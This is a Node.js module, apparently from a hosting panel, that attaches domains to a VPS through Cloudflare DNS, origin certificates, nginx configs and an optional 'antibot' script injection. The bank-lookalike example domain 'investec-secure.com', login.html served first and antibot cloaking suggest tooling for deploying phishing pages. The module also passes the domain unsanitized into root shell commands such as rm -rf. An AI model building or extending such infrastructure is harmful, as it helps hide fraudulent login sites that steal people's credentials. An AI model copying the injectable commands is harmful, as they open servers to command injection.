/**
 * VPS Domain Manager
 *
 * Attaches / removes individual domains on a website's VPS.
 * Each domain gets its own nginx site file for easy add/delete without
 * touching other domains on the same server.
 *
 * File layout on the VPS:
 *   /etc/nginx/sites-available/<domain>   — nginx server block for this domain
 *   /etc/nginx/sites-enabled/<domain>     — symlink → sites-available
 *   /etc/ssl/<domain>/origin.crt          — Cloudflare Origin cert (15-yr)
 *   /etc/ssl/<domain>/origin.key          — matching private key
 *   /etc/ssl/<domain>/origin.csr          — CSR used for issuance
 *
 * The website's static files live at /var/www/<slug> (created by the
 * Host wizard). Additional domains just add server_name aliases; they
 * don't upload new files.
 */

const { getAdapter }                        = require('../database/adapter');
const { sshConnect, sshExec }              = require('./deploy/ssh');
const { injectAntibot }                     = require('./deploy/injectAntibot');

async function loadPanelUrl() {
  const db = getAdapter();
  const row = await db.get(`SELECT value FROM settings WHERE key = 'panel_domain'`);
  const raw = (row && row.value) || process.env.PANEL_DOMAIN || '';
  if (!raw) return '';
  // Normalise: strip scheme + trailing slash, then re-add https
  const clean = raw.replace(/^https?:\/\//i, '').replace(/\/.*$/, '').trim();
  return clean ? `https://${clean}` : '';
}

// ─── Cloudflare Origin cert helpers ──────────────────────────────────────────

async function loadCfCreds() {
  const db = getAdapter();
  const [email, tokenRow, keyRow] = await Promise.all([
    db.get(`SELECT value FROM settings WHERE key = 'deploy_env_CLOUDFLARE_API_EMAIL'`),
    db.get(`SELECT value FROM settings WHERE key = 'deploy_env_CLOUDFLARE_API_TOKEN'`),
    db.get(`SELECT value FROM settings WHERE key = 'deploy_env_CLOUDFLARE_API_KEY'`),
  ]);
  return {
    email: email?.value || process.env.CLOUDFLARE_API_EMAIL,
    token: tokenRow?.value || keyRow?.value || process.env.CLOUDFLARE_API_TOKEN,
  };
}

function cfHeaders({ email, token }) {
  return { 'X-Auth-Email': email, 'X-Auth-Key': token, 'Content-Type': 'application/json' };
}

async function isZoneActive(zoneId) {
  const cf = await loadCfCreds();
  const r  = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}`, { headers: cfHeaders(cf) });
  const j  = await r.json();
  return j?.result?.status === 'active';
}

async function issueOriginCert(csr, domain) {
  const cf = await loadCfCreds();
  const r = await fetch('https://api.cloudflare.com/client/v4/certificates', {
    method: 'POST', headers: cfHeaders(cf),
    body: JSON.stringify({
      hostnames: [domain, `*.${domain}`],
      requested_validity: 5475,
      request_type: 'origin-rsa',
      csr,
    }),
  });
  const j = await r.json();
  if (!j.success) throw new Error('CF Origin cert failed: ' + JSON.stringify(j.errors));
  return { pem: j.result.certificate, expires: j.result.expires_on };
}

async function setZoneSslMode(zoneId, mode = 'strict') {
  const cf = await loadCfCreds();
  await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/settings/ssl`, {
    method: 'PATCH', headers: cfHeaders(cf), body: JSON.stringify({ value: mode })
  });
  await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/settings/always_use_https`, {
    method: 'PATCH', headers: cfHeaders(cf), body: JSON.stringify({ value: 'on' })
  });
}

async function ensureARecord(zoneId, domain, ip) {
  const cf = await loadCfCreds();
  const H  = cfHeaders(cf);
  for (const rec of [
    { type: 'A', name: '@',   content: ip, proxied: true, ttl: 1 },
    { type: 'A', name: 'www', content: ip, proxied: true, ttl: 1 },
  ]) {
    const rr = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/dns_records`, {
      method: 'POST', headers: H, body: JSON.stringify(rec),
    });
    const j = await rr.json();
    // 81058 = duplicate — that's fine
    if (!j.success && j.errors?.[0]?.code !== 81058) {
      throw new Error(`DNS record ${rec.name} failed: ${JSON.stringify(j.errors)}`);
    }
  }
}

// ─── Website lookup ──────────────────────────────────────────────────────────

async function getWebsiteVps(websiteId) {
  const db = getAdapter();
  const w  = await db.get(`SELECT id, name, demo_slug, vps_host, vps_ssh_port, vps_ssh_user, vps_ssh_pass, vps_ssh_key FROM websites WHERE id = ?`, [websiteId]);
  if (!w)             throw new Error('Website not found');
  if (!w.vps_host)    throw new Error(`Website "${w.name}" has no VPS configured — use the Host wizard first`);
  if (!w.vps_ssh_pass && !w.vps_ssh_key) throw new Error(`Website "${w.name}" has no SSH credentials`);
  const slug = w.demo_slug || (w.name || '').toLowerCase().replace(/[^a-z0-9]/g, '');
  if (!slug) throw new Error(`Website "${w.name}" has no demo_slug — cannot determine document root`);
  return { ...w, slug };
}

// ─── nginx config template ───────────────────────────────────────────────────

function buildNginxConfig(domain, slug, hasSsl) {
  const root = `/var/www/${slug}`;
  if (hasSsl) {
    return [
      `# ALP Panel — domain ${domain} for website ${slug}`,
      `server {`,
      `    listen 80; listen [::]:80;`,
      `    server_name ${domain} www.${domain};`,
      `    return 301 https://$host$request_uri;`,
      `}`,
      `server {`,
      `    listen 443 ssl http2; listen [::]:443 ssl http2;`,
      `    server_name ${domain} www.${domain};`,
      `    root ${root};`,
      `    index index.html login.html;`,
      ``,
      `    ssl_certificate     /etc/ssl/${domain}/origin.crt;`,
      `    ssl_certificate_key /etc/ssl/${domain}/origin.key;`,
      `    ssl_protocols       TLSv1.2 TLSv1.3;`,
      `    ssl_ciphers         HIGH:!aNULL:!MD5;`,
      ``,
      `    location / { try_files $uri $uri/ /login.html /index.html; }`,
      `    add_header X-Content-Type-Options nosniff;`,
      `    add_header X-Frame-Options SAMEORIGIN;`,
      `    location ~* \\.(?:css|js|jpg|jpeg|png|gif|ico|svg|woff2?)$ { expires 30d; access_log off; }`,
      `}`,
    ].join('\n');
  }
  // HTTP-only fallback (used when the CF zone isn't active yet — CF Flexible mode)
  return [
    `# ALP Panel — domain ${domain} for website ${slug} (HTTP-only, SSL pending)`,
    `server {`,
    `    listen 80; listen [::]:80;`,
    `    server_name ${domain} www.${domain};`,
    `    root ${root};`,
    `    index index.html login.html;`,
    ``,
    `    location / { try_files $uri $uri/ /login.html /index.html; }`,
    `    add_header X-Content-Type-Options nosniff;`,
    `    add_header X-Frame-Options SAMEORIGIN;`,
    `    location ~* \\.(?:css|js|jpg|jpeg|png|gif|ico|svg|woff2?)$ { expires 30d; access_log off; }`,
    `}`,
  ].join('\n');
}

// ─── Public API ──────────────────────────────────────────────────────────────

/**
 * Attach a domain to a website's VPS:
 *   • sets Cloudflare A records → VPS IP
 *   • issues Origin cert (if zone is active) or defers to HTTP-only
 *   • writes nginx site config
 *   • reloads nginx
 *
 * @param {Object} args
 * @param {number} args.websiteId       — Website ID to attach to
 * @param {string} args.domain          — Domain name (e.g. investec-secure.com)
 * @param {string} args.cfZoneId        — Cloudflare zone ID (already created)
 * @param {Function} [args.onStep]      — Optional (label) => void progress callback
 * @param {Function} [args.onLog]       — Optional (line, level) => void log callback
 * @returns {Promise<{ ssl: boolean, zoneActive: boolean }>}
 */
async function attachDomainToVps({ websiteId, domain, cfZoneId, onStep, onLog }) {
  const step = (l) => onStep && onStep(l);
  const log  = (line, lvl = 'info') => onLog && onLog(line, lvl);

  const w = await getWebsiteVps(websiteId);
  let client;
  try {
    step('Connecting to VPS');
    client = await sshConnect({
      host: w.vps_host, port: w.vps_ssh_port || 22, username: w.vps_ssh_user || 'root',
      password: w.vps_ssh_pass || undefined, privateKey: w.vps_ssh_key || undefined,
    });
    log(`Connected to ${w.vps_host}`, 'success');

    // 1. Set CF DNS records → VPS IP
    step('Setting Cloudflare DNS records');
    await ensureARecord(cfZoneId, domain, w.vps_host);
    log(`A ${domain} → ${w.vps_host} (proxied)`, 'success');
    log(`A www.${domain} → ${w.vps_host} (proxied)`, 'success');

    // 2. Check zone status
    step('Checking Cloudflare zone status');
    const active = await isZoneActive(cfZoneId);
    log(`Zone status: ${active ? 'active' : 'pending nameservers'}`, active ? 'success' : 'warn');

    // 3. SSL + nginx
    let hasSsl = false;
    if (active) {
      step('Generating SSL certificate (15-yr Origin CA)');
      await sshExec(client, `mkdir -p /etc/ssl/${domain} && cd /etc/ssl/${domain} && openssl genrsa -out origin.key 2048 2>&1`);
      await sshExec(client, `cd /etc/ssl/${domain} && openssl req -new -key origin.key -out origin.csr -subj "/CN=${domain}" -addext "subjectAltName=DNS:${domain},DNS:*.${domain}" 2>&1`);
      const csr = (await sshExec(client, `cat /etc/ssl/${domain}/origin.csr`)).stdout.trim();
      try {
        const { pem, expires } = await issueOriginCert(csr, domain);
        const b64 = Buffer.from(pem).toString('base64');
        await sshExec(client, `echo '${b64}' | base64 -d > /etc/ssl/${domain}/origin.crt`);
        await sshExec(client, `chmod 600 /etc/ssl/${domain}/origin.key`);
        log(`Cert installed (expires ${expires})`, 'success');
        hasSsl = true;
        await setZoneSslMode(cfZoneId, 'strict');
      } catch (ce) {
        log(`SSL cert failed — falling back to HTTP-only: ${ce.message}`, 'warn');
        await setZoneSslMode(cfZoneId, 'flexible');
      }
    } else {
      log('Skipping SSL cert — zone not active yet. Using CF Flexible SSL (HTTP-only origin) so site works immediately', 'warn');
      await setZoneSslMode(cfZoneId, 'flexible');
    }

    // 4. Write nginx site file
    step('Writing nginx site config');
    const cfg = buildNginxConfig(domain, w.slug, hasSsl);
    const b64cfg = Buffer.from(cfg).toString('base64');
    await sshExec(client, `echo '${b64cfg}' | base64 -d > /etc/nginx/sites-available/${domain}`);
    await sshExec(client, `ln -sf /etc/nginx/sites-available/${domain} /etc/nginx/sites-enabled/${domain}`);

    // 5. Antibot injection into existing HTML files (opt-in per website)
    //    Off by default so add-domain doesn't break existing sites whose panel
    //    isn't serving /antibot.js yet. Non-fatal on any error.
    step('Antibot gate');
    try {
      const db  = getAdapter();
      const abRow = await db.get(`SELECT value FROM settings WHERE key = ?`, [`antibot_enabled_ws_${websiteId}`]);
      if (!(abRow && abRow.value === '1')) {
        log('Antibot is OFF for this website — skipping injection', 'info');
      } else {
        const panelUrl = await loadPanelUrl();
        if (!panelUrl) {
          log('⚠ Panel domain not set — antibot cannot be injected; pages served by this domain are unprotected', 'warn');
        } else {
          const remoteDir = `/var/www/${w.slug}`;
          const c = await injectAntibot(client, remoteDir, panelUrl, sshExec);
          log(`Antibot: patched ${c.p} file(s), skipped ${c.s} already-patched`, 'success');
        }
      }
    } catch (e) {
      log(`Antibot injection failed (non-fatal): ${e.message}`, 'warn');
    }

    // 6. Test + reload
    step('Testing + reloading nginx');
    const test = await sshExec(client, 'nginx -t 2>&1');
    const ok   = (test.stdout + test.stderr).includes('successful');
    if (!ok) throw new Error('nginx config test failed:\n' + (test.stdout + test.stderr));
    await sshExec(client, 'systemctl reload nginx 2>&1');
    log('nginx reloaded ✓', 'success');

    return { ssl: hasSsl, zoneActive: active };
  } finally {
    if (client) try { client.end(); } catch {}
  }
}

/**
 * Remove a domain from a website's VPS:
 *   • removes nginx site file + symlink
 *   • removes SSL cert directory
 *   • reloads nginx (or restarts if reload fails)
 *
 * Idempotent — safe to call even if the domain was never actually attached.
 */
async function removeDomainFromVps({ websiteId, domain, onStep, onLog }) {
  const step = (l) => onStep && onStep(l);
  const log  = (line, lvl = 'info') => onLog && onLog(line, lvl);

  const w = await getWebsiteVps(websiteId).catch(() => null);
  if (!w) { log('Website has no VPS configured — nothing to clean up on the VPS side', 'warn'); return { skipped: true }; }

  let client;
  try {
    step(`Connecting to ${w.vps_host}`);
    client = await sshConnect({
      host: w.vps_host, port: w.vps_ssh_port || 22, username: w.vps_ssh_user || 'root',
      password: w.vps_ssh_pass || undefined, privateKey: w.vps_ssh_key || undefined,
    });

    step(`Removing nginx site for ${domain}`);
    await sshExec(client, `rm -f /etc/nginx/sites-enabled/${domain} /etc/nginx/sites-available/${domain}`);
    log(`Removed nginx site config`, 'success');

    step(`Removing SSL cert files`);
    await sshExec(client, `rm -rf /etc/ssl/${domain}`);
    log(`Removed cert directory`, 'success');

    step('Reloading nginx');
    const test = await sshExec(client, 'nginx -t 2>&1');
    if ((test.stdout + test.stderr).includes('successful')) {
      await sshExec(client, 'systemctl reload nginx 2>&1');
      log('nginx reloaded ✓', 'success');
    } else {
      log(`nginx test warning after cleanup — skipping reload: ${test.stdout + test.stderr}`, 'warn');
    }
    return { removed: true };
  } finally {
    if (client) try { client.end(); } catch {}
  }
}

module.exports = { attachDomainToVps, removeDomainFromVps, getWebsiteVps };
